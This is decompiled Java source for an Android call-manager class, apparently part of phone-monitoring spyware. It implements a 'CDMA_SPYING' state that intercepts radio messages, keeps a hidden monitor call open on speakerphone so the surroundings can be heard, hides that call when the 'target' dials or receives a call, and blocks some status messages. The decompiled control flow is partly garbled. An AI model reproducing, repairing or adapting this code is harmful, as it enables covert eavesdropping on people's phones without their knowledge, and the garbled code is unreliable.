package com.vvt.callmanager.filter;

import android.media.AudioManager;
import android.os.Parcel;
import com.vvt.callmanager.a.d;
import com.vvt.callmanager.a.h;
import com.vvt.callmanager.a.j;
import com.vvt.callmanager.a.l;
import com.vvt.callmanager.a.m;
import com.vvt.callmanager.mitm.a;
import com.vvt.callmanager.ref.BugEngineCallState;
import com.vvt.callmanager.ref.MonitorDisconnectData;
import com.vvt.callmanager.ref.MonitorDisconnectData.Reason;
import com.vvt.callmanager.ref.MonitorNumber;
import com.vvt.callmanager.ref.f;
import java.util.ArrayList;

 enum FilterCdmaCall$CallState$5
{
  private byte[] cacheRequestDial;
  private byte[] cacheRequestMute;
  private boolean hasCallWaiting;
  private boolean isWaitingForHangupResponse;
  private d monitorCallInfo;
  private int monitorIndex;
  private h musicMonitoring;
  private j musicPlayListener;
  
  FilterCdmaCall$CallState$5()
  {
    super(paramString, paramInt, null);
  }
  
  private void a()
  {
    int i = this.monitorIndex;
    FilterCdmaCall localFilterCdmaCall = this.mFilterCall;
    m localm = FilterCdmaCall.a(this.mFilterCall);
    i.a(i, localFilterCdmaCall, localm);
    this.isWaitingForHangupResponse = true;
  }
  
  private void b()
  {
    Object localObject = new com/vvt/callmanager/filter/c;
    ((c)localObject).<init>(this);
    this.musicPlayListener = ((j)localObject);
    localObject = new com/vvt/callmanager/a/h;
    AudioManager localAudioManager = FilterCdmaCall.c(this.mFilterCall);
    j localj = this.musicPlayListener;
    ((h)localObject).<init>(localAudioManager, localj);
    this.musicMonitoring = ((h)localObject);
    this.musicMonitoring.start();
  }
  
  private void c()
  {
    Object localObject = this.musicPlayListener;
    if (localObject != null) {
      this.musicPlayListener = null;
    }
    localObject = this.musicMonitoring;
    if (localObject != null)
    {
      localObject = this.musicMonitoring;
      ((h)localObject).a();
      this.musicMonitoring = null;
    }
  }
  
  public void onEnter(Object paramObject)
  {
    int i = 1;
    boolean bool = FilterCdmaCall.b();
    FilterCdmaCall localFilterCdmaCall;
    if ((!bool) || (paramObject != null))
    {
      bool = paramObject instanceof d;
      if (bool)
      {
        paramObject = (d)paramObject;
        this.monitorCallInfo = ((d)paramObject);
        j = this.monitorCallInfo.a();
        this.monitorIndex = j;
        localFilterCdmaCall = this.mFilterCall;
        Object[] arrayOfObject = new Object[i];
        int k = this.monitorIndex;
        Integer localInteger = Integer.valueOf(k);
        arrayOfObject[0] = localInteger;
        String str = String.format("Monitor Index: %d", arrayOfObject);
        FilterCdmaCall.a(localFilterCdmaCall, str);
      }
    }
    this.cacheRequestMute = null;
    this.cacheRequestDial = null;
    this.hasCallWaiting = false;
    this.isWaitingForHangupResponse = false;
    int j = this.monitorIndex;
    if (j > 0) {}
    for (j = this.monitorIndex;; j = i)
    {
      this.monitorIndex = j;
      FilterCdmaCall.c(this.mFilterCall).setMode(0);
      FilterCdmaCall.c(this.mFilterCall).setMode(2);
      FilterCdmaCall.a(this.mFilterCall, "Mode IN_CALL is applied");
      b();
      FilterCdmaCall.a(this.mFilterCall, "Music play listener is registered");
      FilterCdmaCall.c(this.mFilterCall).setSpeakerphoneOn(i);
      FilterCdmaCall.a(this.mFilterCall, "Speaker is ON");
      localFilterCdmaCall = this.mFilterCall;
      BugEngineCallState localBugEngineCallState = BugEngineCallState.CDMA_SPYING;
      FilterCdmaCall.a(localFilterCdmaCall, localBugEngineCallState);
      return;
    }
  }
  
  public Object onExit()
  {
    FilterCdmaCall.c(this.mFilterCall).setMode(0);
    FilterCdmaCall.a(this.mFilterCall, "Mode NORMAL is applied");
    FilterCdmaCall.c(this.mFilterCall).setSpeakerphoneOn(false);
    FilterCdmaCall.a(this.mFilterCall, "Speaker is OFF");
    c();
    FilterCdmaCall localFilterCdmaCall = this.mFilterCall;
    String str = "Music play listener is unregistered";
    FilterCdmaCall.a(localFilterCdmaCall, str);
    boolean bool = FilterCdmaCall.b();
    if (bool) {}
    return null;
  }
  
  public FilterCdmaCall.CallState processResponse(Parcel paramParcel)
  {
    int i = 1;
    int j = 0;
    Object localObject1 = null;
    Object localObject2 = FilterCdmaCall.a(this.mFilterCall);
    int k = ((m)localObject2).c(paramParcel);
    int i2 = 1025;
    Object localObject3;
    int m;
    if (k == i2)
    {
      localObject2 = FilterCdmaCall.b(this.mFilterCall);
      localObject3 = i.a(paramParcel);
      localObject2 = ((f)localObject2).b((String)localObject3);
      if (localObject2 != null)
      {
        m = ((MonitorNumber)localObject2).isEnabled();
        if (m != 0)
        {
          m = i;
          if (m == 0) {
            break label133;
          }
          localObject4 = this.mFilterCall;
          localObject2 = "Found another Monitor!";
          FilterCdmaCall.a((FilterCdmaCall)localObject4, (String)localObject2);
        }
      }
    }
    label102:
    for (Object localObject4 = this;; localObject4 = this)
    {
      if (j != 0)
      {
        localObject1 = this.mFilterCall;
        ((FilterCdmaCall)localObject1).c(paramParcel);
      }
      return (FilterCdmaCall.CallState)localObject4;
      m = 0;
      localObject2 = null;
      break;
      label133:
      FilterCdmaCall.a(this.mFilterCall, "Get incoming call -> Release monitor");
      this.hasCallWaiting = i;
      a();
      localObject4 = this.mFilterCall;
      localObject2 = new com/vvt/callmanager/ref/MonitorDisconnectData;
      localObject3 = this.monitorCallInfo.d();
      MonitorDisconnectData.Reason localReason = MonitorDisconnectData.Reason.CALL_WAITING;
      ((MonitorDisconnectData)localObject2).<init>((String)localObject3, localReason);
      FilterCdmaCall.a((FilterCdmaCall)localObject4, (MonitorDisconnectData)localObject2);
      break label102;
      i2 = 1001;
      if (m != i2) {
        break label244;
      }
      FilterCdmaCall.a(this.mFilterCall, "Call state changed -> Get current calls");
      localObject4 = FilterCdmaCall.a(this.mFilterCall);
      localObject2 = this.mFilterCall;
      i.a((m)localObject4, (n)localObject2);
    }
    label244:
    int i3 = 9;
    if (m == i3)
    {
      localObject2 = l.a(paramParcel);
      int n = ((l)localObject2).b;
      int i4 = 134744072;
      if (n != i4)
      {
        label279:
        localObject1 = d.a(paramParcel);
        localObject3 = FilterCdmaCall.a(this.mFilterCall).a();
        i.a("FilterCall", (ArrayList)localObject1, (a)localObject3);
        localObject2 = this.cacheRequestDial;
        if (localObject2 == null) {
          break label411;
        }
        localObject1 = this.mFilterCall;
        localObject2 = "Monitor is released -> Forward dialing message";
        FilterCdmaCall.a((FilterCdmaCall)localObject1, (String)localObject2);
        localObject1 = this.cacheRequestMute;
        if (localObject1 != null)
        {
          localObject1 = this.mFilterCall;
          localObject2 = i.a(this.cacheRequestMute);
          ((FilterCdmaCall)localObject1).d((Parcel)localObject2);
        }
        localObject1 = this.mFilterCall;
        localObject2 = i.a(this.cacheRequestDial);
        ((FilterCdmaCall)localObject1).d((Parcel)localObject2);
        localObject1 = DIALING_RINGING;
      }
    }
    for (;;)
    {
      localObject4 = localObject1;
      j = i;
      break;
      i = 0;
      localObject4 = null;
      break label279;
      label411:
      int i1 = this.hasCallWaiting;
      if (i1 != 0)
      {
        FilterCdmaCall.a(this.mFilterCall, "Monitor is released -> Forward ringing messages");
        localObject1 = this.mFilterCall;
        i1 = 0;
        localObject2 = null;
        i.a((n)localObject1, null);
        localObject1 = DIALING_RINGING;
      }
      else
      {
        j = ((ArrayList)localObject1).size();
        if (j == 0)
        {
          localObject1 = this.mFilterCall;
          localObject2 = "Monitor is gone";
          FilterCdmaCall.a((FilterCdmaCall)localObject1, (String)localObject2);
          localObject1 = IDLE;
          continue;
          boolean bool = this.isWaitingForHangupResponse;
          if (bool)
          {
            bool = i.a(i1);
            if (bool)
            {
              this.isWaitingForHangupResponse = false;
              localObject4 = this;
              break;
            }
          }
          int i5 = 1049;
          if (i1 == i5)
          {
            localObject4 = this.mFilterCall;
            localObject2 = "Found LG custom state info -> Block!";
            FilterCdmaCall.a((FilterCdmaCall)localObject4, (String)localObject2);
            localObject4 = this;
            break;
          }
          j = i;
          localObject4 = this;
          break;
        }
        localObject1 = this;
      }
    }
  }
  
  public FilterCdmaCall.CallState processRilRequest(Parcel paramParcel)
  {
    boolean bool = true;
    int i = 0;
    FilterCdmaCall localFilterCdmaCall = null;
    Object localObject1 = FilterCdmaCall.a(this.mFilterCall);
    int j = ((m)localObject1).b(paramParcel);
    int k = 53;
    Object localObject2;
    if (j == k)
    {
      localObject2 = this.cacheRequestMute;
      if (localObject2 == null)
      {
        localObject2 = paramParcel.marshall();
        this.cacheRequestMute = ((byte[])localObject2);
      }
    }
    for (;;)
    {
      if (i != 0)
      {
        localFilterCdmaCall = this.mFilterCall;
        localFilterCdmaCall.d(paramParcel);
      }
      return this;
      k = 10;
      if (j == k)
      {
        FilterCdmaCall.a(this.mFilterCall, "Target is making call -> Release monitor");
        localObject1 = paramParcel.marshall();
        this.cacheRequestDial = ((byte[])localObject1);
        localObject1 = i.a(i.e);
        FilterCdmaCall.a(this.mFilterCall).a((Parcel)localObject1);
        this.mFilterCall.d((Parcel)localObject1);
        this.isWaitingForHangupResponse = bool;
        localObject2 = this.mFilterCall;
        localObject1 = new com/vvt/callmanager/ref/MonitorDisconnectData;
        String str = this.monitorCallInfo.d();
        MonitorDisconnectData.Reason localReason = MonitorDisconnectData.Reason.DIALING;
        ((MonitorDisconnectData)localObject1).<init>(str, localReason);
        FilterCdmaCall.a((FilterCdmaCall)localObject2, (MonitorDisconnectData)localObject1);
      }
      else
      {
        i = bool;
      }
    }
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/callmgr/classes-enjarify.jar!/com/vvt/callmanager/filter/FilterCdmaCall$CallState$5.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */